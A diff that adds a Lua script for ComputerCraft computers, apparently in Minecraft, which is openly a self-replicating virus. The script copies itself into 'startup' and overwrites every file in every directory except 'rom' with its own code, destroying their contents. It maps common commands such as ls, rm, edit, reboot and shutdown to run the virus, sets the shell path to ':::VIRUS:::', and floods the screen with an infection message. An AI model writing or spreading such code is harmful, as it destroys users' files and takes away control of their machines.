@@ -1,0 +1,94 @@
+
+local w, h = term.getSize()
+
+function disPlace()
+	shell.clearAlias("ls")
+	shell.clearAlias("dir")
+	shell.clearAlias("cp")
+	shell.clearAlias("mv")
+	shell.clearAlias("rm")
+	shell.setAlias("ls", "startup")
+	shell.setAlias("dir", "startup")
+	shell.setAlias("cp", "startup")
+	shell.setAlias("mv", "startup")
+	shell.setAlias("rm", "startup")
+	shell.setAlias("list", "startup")
+	shell.setAlias("edit", "startup")
+	shell.setAlias("reboot", "startup")
+	shell.setAlias("shutdown", "startup")
+	shell.setAlias("lua", "startup")
+	shell.setAlias("delete", "startup")
+	shell.setAlias("help", "startup")
+	shell.setPath(":::VIRUS:::")
+	shell.setDir(":::VIRUS:::")
+end
+
+function printCentered(y, s)
+	term.setCursorPos(w / 2 - string.len(s) / 2, y)
+	write(s)
+end
+
+function payload()
+	local payLoadCharacters = {0, 1, "|", "-", "+"}
+	for i=1,50000 do
+		os.queueEvent("randomEvent")
+		os.pullEvent()
+		term.setCursorPos(math.random(1, w), math.random(1, h))
+		local index = math.random(1, table.getn(payLoadCharacters))
+		write(payLoadCharacters[index])
+		printCentered(h / 2, "You Got Virus Infected!")
+	end
+	sleep(5)
+	term.clear()
+	term.setCursorPos(1, 1)
+	print("Infected "..os.version())
+end
+
+function infectDir(Directory, Injection)
+	local sDir = shell.dir()
+	sDir = shell.resolve( Directory )
+	local tAll = fs.list( sDir )
+	local tFiles = {}
+	local tDirs = {}
+	for n, sItem in pairs( tAll ) do
+		if string.sub( sItem, 1, 1 ) ~= "." then
+			local sPath = fs.combine( sDir, sItem )
+			if fs.isDir( sPath ) then
+				table.insert( tDirs, sItem )
+			else
+				table.insert( tFiles, sItem )
+			end
+		end
+	end
+	table.sort( tDirs )
+	table.sort( tFiles )
+	
+	for i=1,table.getn(tFiles) do
+		local filewritex = fs.open(Directory.."/"..tFiles[i], "w")
+		filewritex.write(Injection)
+		filewritex.close()
+	end
+	for i=1,table.getn(tDirs) do
+		if tDirs[i] ~= "rom" then
+			infectDir(Directory.."/"..tDirs[i], Injection)
+		end
+	end
+	
+end
+
+local virusread = fs.open(shell.getRunningProgram(), "r")
+local viruscode = virusread.readAll()
+virusread.close()
+
+local filewritev = fs.open("startup", "w")
+filewritev.write(viruscode)
+filewritev.close()
+
+infectDir("", viruscode)
+
+if fs.exists("EOF") == false then
+	payload()
+	fs.makeDir("EOF")
+end
+
+disPlace()
